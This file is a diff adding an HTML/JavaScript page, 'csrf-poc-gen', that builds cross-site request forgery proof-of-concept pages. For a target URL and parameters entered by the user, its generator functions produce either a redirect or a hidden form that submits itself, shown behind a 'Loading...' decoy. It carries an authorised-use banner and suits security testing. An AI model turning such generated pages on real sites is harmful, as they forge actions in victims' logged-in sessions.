@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>CSRF PoC Generator</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=DM+Sans:wght@300;400;500&display=swap');
+
+  :root {
+    --bg: #f5f4f2;
+    --surface: #ffffff;
+    --surface-2: #f0eeeb;
+    --border: #dddbd6;
+    --border-2: #c9c7c2;
+    --text: #1a1917;
+    --text-2: #5a5854;
+    --text-3: #9a9893;
+    --accent: #1a1917;
+    --accent-fg: #ffffff;
+    --danger: #c0392b;
+    --success: #1d6a45;
+    --code-bg: #f0eeeb;
+    --code-border: #dddbd6;
+    --highlight: rgba(26,25,23,0.05);
+    --shadow: 0 1px 3px rgba(0,0,0,0.08), 0 0 0 1px rgba(0,0,0,0.04);
+    --tag-bg: #e8e6e1;
+    --tag-text: #3a3835;
+  }
+
+  [data-theme="dark"] {
+    --bg: #131211;
+    --surface: #1e1d1b;
+    --surface-2: #252422;
+    --border: #2e2d2a;
+    --border-2: #3a3936;
+    --text: #e8e6e1;
+    --text-2: #a09e99;
+    --text-3: #5a5854;
+    --accent: #e8e6e1;
+    --accent-fg: #131211;
+    --danger: #e57373;
+    --success: #66bb8a;
+    --code-bg: #131211;
+    --code-border: #2e2d2a;
+    --highlight: rgba(255,255,255,0.04);
+    --shadow: 0 1px 4px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,255,255,0.04);
+    --tag-bg: #2e2d2a;
+    --tag-text: #c0bdb8;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { font-size: 15px; }
+
+  body {
+    font-family: 'DM Sans', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    line-height: 1.6;
+    transition: background 0.2s, color 0.2s;
+  }
+
+  /* ── Layout ── */
+  .shell {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 2.5rem 1.5rem 4rem;
+  }
+
+  /* ── Header ── */
+  header {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    margin-bottom: 2.5rem;
+    gap: 1rem;
+  }
+  .brand { display: flex; flex-direction: column; gap: 4px; }
+  .brand-row { display: flex; align-items: center; gap: 10px; }
+  .brand-icon {
+    width: 32px; height: 32px;
+    background: var(--accent);
+    border-radius: 6px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .brand-icon svg { width: 18px; height: 18px; fill: var(--accent-fg); }
+  h1 {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 1.25rem;
+    font-weight: 500;
+    letter-spacing: -0.02em;
+    color: var(--text);
+  }
+  .brand-sub {
+    font-size: 0.8rem;
+    color: var(--text-3);
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    font-weight: 400;
+  }
+  .header-right { display: flex; align-items: center; gap: 8px; }
+
+  /* ── Theme toggle ── */
+  .theme-btn {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--text-2);
+    border-radius: 6px;
+    width: 34px; height: 34px;
+    display: flex; align-items: center; justify-content: center;
+    cursor: pointer;
+    transition: background 0.15s, border-color 0.15s;
+    flex-shrink: 0;
+  }
+  .theme-btn:hover { background: var(--surface-2); border-color: var(--border-2); }
+  .theme-btn svg { width: 16px; height: 16px; }
+  .icon-sun { display: none; }
+  .icon-moon { display: block; }
+  [data-theme="dark"] .icon-sun { display: block; }
+  [data-theme="dark"] .icon-moon { display: none; }
+
+  /* ── Warning banner ── */
+  .banner {
+    display: flex; gap: 10px; align-items: flex-start;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--danger);
+    border-radius: 8px;
+    padding: 0.875rem 1rem;
+    margin-bottom: 1.75rem;
+    font-size: 0.825rem;
+    color: var(--text-2);
+    line-height: 1.55;
+  }
+  .banner-icon { color: var(--danger); flex-shrink: 0; margin-top: 1px; }
+  .banner strong { color: var(--danger); font-weight: 500; }
+
+  /* ── Panel ── */
+  .panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    margin-bottom: 1.25rem;
+    box-shadow: var(--shadow);
+  }
+  .panel-header {
+    padding: 0.9rem 1.25rem;
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  .panel-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.75rem;
+    font-weight: 500;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--text-3);
+  }
+  .panel-body { padding: 1.25rem; }
+
+  /* ── Form ── */
+  .field { margin-bottom: 1.1rem; }
+  .field:last-child { margin-bottom: 0; }
+  label {
+    display: block;
+    font-size: 0.8rem;
+    font-weight: 500;
+    color: var(--text-2);
+    margin-bottom: 5px;
+    letter-spacing: 0.01em;
+  }
+  .label-hint {
+    font-weight: 400;
+    color: var(--text-3);
+    font-size: 0.75rem;
+    margin-left: 4px;
+  }
+  input[type="text"], input[type="url"], select, textarea {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    border-radius: 6px;
+    padding: 0.55rem 0.75rem;
+    font-size: 0.875rem;
+    font-family: inherit;
+    transition: border-color 0.15s, box-shadow 0.15s;
+    outline: none;
+    appearance: none;
+    -webkit-appearance: none;
+  }
+  input[type="text"]:focus, input[type="url"]:focus, select:focus, textarea:focus {
+    border-color: var(--border-2);
+    box-shadow: 0 0 0 3px var(--highlight);
+  }
+  input::placeholder { color: var(--text-3); }
+  select {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%239a9893' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 10px center;
+    padding-right: 2rem;
+    cursor: pointer;
+  }
+
+  /* ── Method tabs ── */
+  .method-tabs { display: flex; gap: 6px; }
+  .method-tab {
+    padding: 0.45rem 1rem;
+    border-radius: 6px;
+    border: 1px solid var(--border);
+    background: var(--bg);
+    color: var(--text-2);
+    font-size: 0.825rem;
+    font-weight: 500;
+    font-family: 'IBM Plex Mono', monospace;
+    cursor: pointer;
+    transition: all 0.15s;
+    letter-spacing: 0.02em;
+  }
+  .method-tab:hover { border-color: var(--border-2); }
+  .method-tab.active {
+    background: var(--accent);
+    border-color: var(--accent);
+    color: var(--accent-fg);
+  }
+
+  /* ── Params ── */
+  .params-list { display: flex; flex-direction: column; gap: 8px; }
+  .param-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr auto;
+    gap: 8px;
+    align-items: center;
+  }
+  .param-row input { font-family: 'IBM Plex Mono', monospace; font-size: 0.8rem; }
+  .btn-remove {
+    width: 30px; height: 30px;
+    background: transparent;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text-3);
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    transition: all 0.15s;
+  }
+  .btn-remove:hover { border-color: var(--danger); color: var(--danger); background: var(--highlight); }
+  .btn-remove svg { width: 13px; height: 13px; }
+  .params-actions { margin-top: 10px; }
+  .btn-add {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: transparent;
+    border: 1px dashed var(--border-2);
+    color: var(--text-2);
+    border-radius: 6px;
+    padding: 0.45rem 0.875rem;
+    font-size: 0.8rem;
+    font-family: inherit;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .btn-add:hover { border-color: var(--accent); color: var(--accent); background: var(--highlight); }
+  .btn-add svg { width: 13px; height: 13px; }
+
+  /* ── Actions ── */
+  .actions {
+    display: flex; gap: 8px; align-items: center;
+    flex-wrap: wrap;
+  }
+  .btn-primary {
+    display: inline-flex; align-items: center; gap: 7px;
+    background: var(--accent);
+    color: var(--accent-fg);
+    border: 1px solid var(--accent);
+    border-radius: 7px;
+    padding: 0.6rem 1.25rem;
+    font-size: 0.875rem;
+    font-weight: 500;
+    font-family: inherit;
+    cursor: pointer;
+    transition: opacity 0.15s;
+  }
+  .btn-primary:hover { opacity: 0.85; }
+  .btn-primary svg { width: 15px; height: 15px; }
+  .btn-secondary {
+    display: inline-flex; align-items: center; gap: 7px;
+    background: var(--surface);
+    color: var(--text);
+    border: 1px solid var(--border);
+    border-radius: 7px;
+    padding: 0.6rem 1.1rem;
+    font-size: 0.875rem;
+    font-weight: 400;
+    font-family: inherit;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .btn-secondary:hover { background: var(--surface-2); border-color: var(--border-2); }
+  .btn-secondary svg { width: 15px; height: 15px; }
+
+  /* ── Output ── */
+  .output-panel { display: none; }
+  .output-panel.visible { display: block; }
+  .output-meta {
+    display: flex; gap: 8px; align-items: center; flex-wrap: wrap;
+  }
+  .tag {
+    display: inline-flex; align-items: center;
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    border-radius: 4px;
+    padding: 2px 8px;
+    font-size: 0.72rem;
+    font-family: 'IBM Plex Mono', monospace;
+    font-weight: 500;
+    letter-spacing: 0.02em;
+  }
+  .tag.method-get { background: #dff0d8; color: #1d6a45; }
+  .tag.method-post { background: #d9ecf7; color: #1a4f7a; }
+  [data-theme="dark"] .tag.method-get { background: #1a3d2a; color: #66bb8a; }
+  [data-theme="dark"] .tag.method-post { background: #162840; color: #64aad4; }
+
+  .code-wrap {
+    position: relative;
+    margin-top: 0.75rem;
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 8px;
+    overflow: hidden;
+  }
+  .code-toolbar {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 0.55rem 1rem;
+    border-bottom: 1px solid var(--code-border);
+  }
+  .code-lang {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--text-3);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+  .code-actions { display: flex; gap: 6px; }
+  .btn-tool {
+    display: inline-flex; align-items: center; gap: 5px;
+    background: transparent;
+    border: 1px solid var(--code-border);
+    color: var(--text-2);
+    border-radius: 5px;
+    padding: 0.3rem 0.65rem;
+    font-size: 0.75rem;
+    font-family: inherit;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .btn-tool:hover { background: var(--border); color: var(--text); }
+  .btn-tool.copied { border-color: var(--success); color: var(--success); }
+  .btn-tool svg { width: 12px; height: 12px; }
+  pre {
+    padding: 1rem;
+    overflow-x: auto;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.775rem;
+    line-height: 1.65;
+    color: var(--text);
+    white-space: pre;
+  }
+
+  /* ── Preview ── */
+  .preview-note {
+    font-size: 0.8rem;
+    color: var(--text-3);
+    margin-top: 0.65rem;
+    display: flex; align-items: center; gap: 5px;
+  }
+  .preview-note svg { width: 12px; height: 12px; flex-shrink: 0; }
+
+  /* ── Footer ── */
+  footer {
+    margin-top: 3rem;
+    padding-top: 1.5rem;
+    border-top: 1px solid var(--border);
+    display: flex; justify-content: space-between; align-items: center;
+    flex-wrap: wrap; gap: 0.5rem;
+  }
+  .footer-text {
+    font-size: 0.75rem;
+    color: var(--text-3);
+    font-family: 'IBM Plex Mono', monospace;
+  }
+
+  /* ── Responsive ── */
+  @media (max-width: 560px) {
+    .param-row { grid-template-columns: 1fr 1fr auto; }
+    .actions { flex-direction: column; align-items: stretch; }
+    .btn-primary, .btn-secondary { justify-content: center; }
+  }
+</style>
+</head>
+<body>
+<div class="shell">
+
+  <!-- Header -->
+  <header>
+    <div class="brand">
+      <div class="brand-row">
+        <div class="brand-icon">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-4H7l5-8v4h4l-5 8z"/>
+          </svg>
+        </div>
+        <h1>csrf-poc-gen</h1>
+      </div>
+      <span class="brand-sub">Cross-Site Request Forgery · PoC Generator</span>
+    </div>
+    <div class="header-right">
+      <button class="theme-btn" id="themeBtn" title="Toggle dark mode" aria-label="Toggle dark mode">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/>
+        </svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/>
+          <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/>
+          <line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/>
+          <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <!-- Warning -->
+  <div class="banner">
+    <div class="banner-icon">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
+      </svg>
+    </div>
+    <div><strong>Educational &amp; Authorized Use Only.</strong> This tool is intended exclusively for security researchers, penetration testers, and developers testing systems they have explicit permission to assess. Unauthorized use against third-party systems is illegal and unethical.</div>
+  </div>
+
+  <!-- Config Panel -->
+  <div class="panel">
+    <div class="panel-header">
+      <span class="panel-title">Target Configuration</span>
+    </div>
+    <div class="panel-body">
+      <div class="field">
+        <label for="targetUrl">Target URL <span class="label-hint">full endpoint URI</span></label>
+        <input type="url" id="targetUrl" placeholder="https://example.com/api/action" autocomplete="off" spellcheck="false" />
+      </div>
+      <div class="field">
+        <label>Request Method</label>
+        <div class="method-tabs">
+          <button class="method-tab active" data-method="GET">GET</button>
+          <button class="method-tab" data-method="POST">POST</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Params Panel -->
+  <div class="panel">
+    <div class="panel-header">
+      <span class="panel-title">Parameters</span>
+    </div>
+    <div class="panel-body">
+      <div id="paramsList" class="params-list"></div>
+      <div class="params-actions">
+        <button class="btn-add" id="addParamBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>
+          </svg>
+          Add parameter
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Options Panel -->
+  <div class="panel">
+    <div class="panel-header">
+      <span class="panel-title">Options</span>
+    </div>
+    <div class="panel-body">
+      <div class="field">
+        <label for="pageTitle">PoC Page Title <span class="label-hint">shown in browser tab</span></label>
+        <input type="text" id="pageTitle" value="CSRF PoC" />
+      </div>
+      <div class="field">
+        <label for="autoSubmit">Auto-submit Delay <span class="label-hint">milliseconds (0 = instant)</span></label>
+        <input type="text" id="autoSubmit" value="0" style="max-width: 120px;" />
+      </div>
+    </div>
+  </div>
+
+  <!-- Generate -->
+  <div class="actions" style="margin-bottom: 1.75rem;">
+    <button class="btn-primary" id="generateBtn">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <polygon points="5 3 19 12 5 21 5 3"/>
+      </svg>
+      Generate PoC
+    </button>
+    <button class="btn-secondary" id="resetBtn">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 102.13-9.36L1 10"/>
+      </svg>
+      Reset form
+    </button>
+  </div>
+
+  <!-- Output Panel -->
+  <div class="panel output-panel" id="outputPanel">
+    <div class="panel-header">
+      <span class="panel-title">Generated PoC</span>
+      <div class="output-meta" id="outputMeta"></div>
+    </div>
+    <div class="panel-body">
+      <div class="code-wrap">
+        <div class="code-toolbar">
+          <span class="code-lang">html</span>
+          <div class="code-actions">
+            <button class="btn-tool" id="copyBtn">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
+              </svg>
+              Copy
+            </button>
+            <button class="btn-tool" id="downloadBtn">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
+              </svg>
+              Download
+            </button>
+          </div>
+        </div>
+        <pre id="outputCode"></pre>
+      </div>
+      <p class="preview-note">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+        </svg>
+        Save as <code style="font-family:'IBM Plex Mono',monospace; font-size:0.75em; background:var(--code-bg); padding:1px 5px; border-radius:3px;">.html</code> and open in a browser to trigger the request. The victim must be authenticated to the target site.
+      </p>
+    </div>
+  </div>
+
+  <footer>
+    <span class="footer-text">csrf-poc-gen · security research tool</span>
+    <span class="footer-text">educational use only</span>
+  </footer>
+
+</div>
+
+<script>
+(function () {
+  /* ── State ── */
+  let method = 'GET';
+  let paramCount = 0;
+
+  /* ── Theme ── */
+  const root = document.documentElement;
+  const themeBtn = document.getElementById('themeBtn');
+  const saved = localStorage.getItem('csrf-theme');
+  if (saved) root.setAttribute('data-theme', saved);
+  themeBtn.addEventListener('click', () => {
+    const next = root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    root.setAttribute('data-theme', next);
+    localStorage.setItem('csrf-theme', next);
+  });
+
+  /* ── Method tabs ── */
+  document.querySelectorAll('.method-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+      method = tab.dataset.method;
+    });
+  });
+
+  /* ── Params ── */
+  const paramsList = document.getElementById('paramsList');
+
+  function addParam(key = '', value = '') {
+    paramCount++;
+    const id = paramCount;
+    const row = document.createElement('div');
+    row.className = 'param-row';
+    row.dataset.id = id;
+    row.innerHTML = `
+      <input type="text" placeholder="name" value="${esc(key)}" class="param-key" spellcheck="false" autocomplete="off" />
+      <input type="text" placeholder="value" value="${esc(value)}" class="param-val" spellcheck="false" autocomplete="off" />
+      <button class="btn-remove" title="Remove" aria-label="Remove parameter">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
+        </svg>
+      </button>`;
+    row.querySelector('.btn-remove').addEventListener('click', () => row.remove());
+    paramsList.appendChild(row);
+  }
+
+  document.getElementById('addParamBtn').addEventListener('click', () => addParam());
+
+  /* seed one empty param */
+  addParam();
+
+  /* ── Generate ── */
+  document.getElementById('generateBtn').addEventListener('click', generate);
+
+  function getParams() {
+    const rows = paramsList.querySelectorAll('.param-row');
+    const params = [];
+    rows.forEach(r => {
+      const k = r.querySelector('.param-key').value.trim();
+      const v = r.querySelector('.param-val').value.trim();
+      if (k) params.push({ key: k, value: v });
+    });
+    return params;
+  }
+
+  function esc(str) {
+    return String(str).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  function escHtmlAttr(str) {
+    return String(str)
+      .replace(/&/g,'&amp;')
+      .replace(/"/g,'&quot;')
+      .replace(/</g,'&lt;')
+      .replace(/>/g,'&gt;');
+  }
+
+  function generate() {
+    const url = document.getElementById('targetUrl').value.trim();
+    if (!url) {
+      document.getElementById('targetUrl').focus();
+      document.getElementById('targetUrl').style.borderColor = 'var(--danger)';
+      setTimeout(() => document.getElementById('targetUrl').style.borderColor = '', 1500);
+      return;
+    }
+
+    const params = getParams();
+    const title = document.getElementById('pageTitle').value.trim() || 'CSRF PoC';
+    const delay = parseInt(document.getElementById('autoSubmit').value, 10) || 0;
+    const delayComment = delay > 0 ? ` after ${delay}ms` : ' immediately';
+
+    let html = '';
+
+    if (method === 'GET') {
+      const qs = params.map(p => `${encodeURIComponent(p.key)}=${encodeURIComponent(p.value)}`).join('&');
+      const fullUrl = qs ? `${url}?${qs}` : url;
+      html = buildGetPoC(title, fullUrl, delayComment, delay);
+    } else {
+      html = buildPostPoC(title, url, params, delayComment, delay);
+    }
+
+    /* show output */
+    const out = document.getElementById('outputPanel');
+    out.classList.add('visible');
+    document.getElementById('outputCode').textContent = html;
+
+    const meta = document.getElementById('outputMeta');
+    const mClass = method === 'GET' ? 'method-get' : 'method-post';
+    meta.innerHTML = `<span class="tag ${mClass}">${method}</span><span class="tag">${params.length} param${params.length !== 1 ? 's' : ''}</span>`;
+
+    out.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+
+  function buildGetPoC(title, fullUrl, delayComment, delay) {
+    const safeTitle = escHtmlAttr(title);
+    const safeUrl = escHtmlAttr(fullUrl);
+    const delayLine = delay > 0
+      ? `    setTimeout(function() { window.location = "${safeUrl}"; }, ${delay});`
+      : `    window.location = "${safeUrl}";`;
+    return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>${safeTitle}</title>
+</head>
+<body>
+  <p>Loading...</p>
+  <script>
+    // CSRF PoC - GET method
+    // Redirects${delayComment} to the target URL
+${delayLine}
+  <\/script>
+</body>
+</html>`;
+  }
+
+  function buildPostPoC(title, url, params, delayComment, delay) {
+    const safeTitle = escHtmlAttr(title);
+    const safeUrl = escHtmlAttr(url);
+    const inputs = params.map(p =>
+      `    <input type="hidden" name="${escHtmlAttr(p.key)}" value="${escHtmlAttr(p.value)}" />`
+    ).join('\n');
+    const submitLine = delay > 0
+      ? `    setTimeout(function() { document.getElementById('csrf-form').submit(); }, ${delay});`
+      : `    document.getElementById('csrf-form').submit();`;
+    return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>${safeTitle}</title>
+</head>
+<body>
+  <p>Loading...</p>
+  <form id="csrf-form" action="${safeUrl}" method="POST">
+${inputs}
+  </form>
+  <script>
+    // CSRF PoC - POST method
+    // Auto-submits form${delayComment}
+${submitLine}
+  <\/script>
+</body>
+</html>`;
+  }
+
+  /* ── Copy ── */
+  document.getElementById('copyBtn').addEventListener('click', function () {
+    const code = document.getElementById('outputCode').textContent;
+    if (!code) return;
+    navigator.clipboard.writeText(code).then(() => {
+      const btn = this;
+      btn.classList.add('copied');
+      btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:12px;height:12px"><polyline points="20 6 9 17 4 12"/></svg> Copied`;
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:12px;height:12px"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> Copy`;
+      }, 2000);
+    });
+  });
+
+  /* ── Download ── */
+  document.getElementById('downloadBtn').addEventListener('click', function () {
+    const code = document.getElementById('outputCode').textContent;
+    if (!code) return;
+    const blob = new Blob([code], { type: 'text/html' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'csrf-poc.html';
+    a.click();
+    URL.revokeObjectURL(a.href);
+  });
+
+  /* ── Reset ── */
+  document.getElementById('resetBtn').addEventListener('click', () => {
+    document.getElementById('targetUrl').value = '';
+    document.getElementById('pageTitle').value = 'CSRF PoC';
+    document.getElementById('autoSubmit').value = '0';
+    paramsList.innerHTML = '';
+    paramCount = 0;
+    addParam();
+    document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
+    document.querySelector('[data-method="GET"]').classList.add('active');
+    method = 'GET';
+    document.getElementById('outputPanel').classList.remove('visible');
+    document.getElementById('outputCode').textContent = '';
+  });
+})();
+</script>
+</body>
+</html>
